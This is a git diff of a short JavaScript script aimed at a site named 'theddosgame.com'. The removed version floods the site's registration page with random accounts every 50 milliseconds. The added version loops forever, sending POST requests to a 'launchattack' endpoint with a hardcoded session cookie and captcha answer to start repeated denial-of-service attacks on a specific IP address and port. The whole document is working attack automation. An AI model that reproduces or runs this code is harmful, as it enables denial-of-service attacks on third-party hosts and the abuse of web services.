@@ -1,47 +1,41 @@
-let relurl = "https://apibytow.robloxdiscord.pl/agg"
-
-import fetch from 'node-fetch'
-import fs from 'fs'
-process.on("uncaughtException", (err, origin) => {
-  fs.writeSync(
-    process.stderr.fd,
-    `Caught exception: ${err}\n Exception origin: ${origin}`
-  );
-});
-function makeid(length) {
-        var result           = '';
-        var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-        var charactersLength = characters.length;
-        for ( var i = 0; i < length; i++ ) {
-        result += characters.charAt(Math.floor(Math.random() * 
-    charactersLength));
+async function r(){
+    await fetch("https://theddosgame.com/captcha.php", {
+        "credentials": "include",
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0",
+            "Accept": "image/avif,image/webp,*/*",
+            "Accept-Language": "en-US,en;q=0.5",
+            "Alt-Used": "theddosgame.com",
+            "Sec-Fetch-Dest": "image",
+            "Sec-Fetch-Mode": "no-cors",
+            "Sec-Fetch-Site": "same-origin",
+            "cookie": 'PHPSESSID=5e28325a8a7af29d478add3df13f8154'
+        },
+        "referrer": "https://theddosgame.com/attack.php",
+        "method": "GET",
+        "mode": "cors"
+    });
+    fetch("https://theddosgame.com/launchattack.php", {
+        "credentials": "include",
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+            "Accept-Language": "en-US,en;q=0.5",
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Alt-Used": "theddosgame.com",
+            "Upgrade-Insecure-Requests": "1",
+            "Sec-Fetch-Dest": "document",
+            "Sec-Fetch-Mode": "navigate",
+            "Sec-Fetch-Site": "same-origin",
+            "Sec-Fetch-User": "?1",
+            "cookie": 'PHPSESSID=5e28325a8a7af29d478add3df13f8154'
+        },
+        "referrer": "https://theddosgame.com/attack.php",
+        "body": "vicip=64.32.54.38&port=433&time=30&captcha_challenge=RPU&launchattack=",
+        "method": "POST",
+        "mode": "cors"
+    }).then(e=>{
+        r()
+    })
     }
-    return result;
-    }
-setInterval(()=>{
-  
-let ae = makeid(11)
-let ze = makeid(40)
-fetch("https://theddosgame.com/process.php", {
-  "headers": {
-    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
-    "accept-language": "en-US,en;q=0.9",
-    "cache-control": "max-age=0",
-    "content-type": "application/x-www-form-urlencoded",
-    "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"104\"",
-    "sec-ch-ua-mobile": "?0",
-    "sec-ch-ua-platform": "\"Linux\"",
-    "sec-fetch-dest": "document",
-    "sec-fetch-mode": "navigate",
-    "sec-fetch-site": "same-origin",
-    "sec-fetch-user": "?1",
-    "upgrade-insecure-requests": "1"
-  },
-  "referrer": "https://theddosgame.com/process.php",
-  "referrerPolicy": "strict-origin-when-cross-origin",
-  "body": "username="+ae+"&pass="+ze+"&cpass="+ze+"&secret=123456&register=",
-  "method": "POST",
-  "mode": "cors",
-  "credentials": "include"
-})
-},50)
+    r()
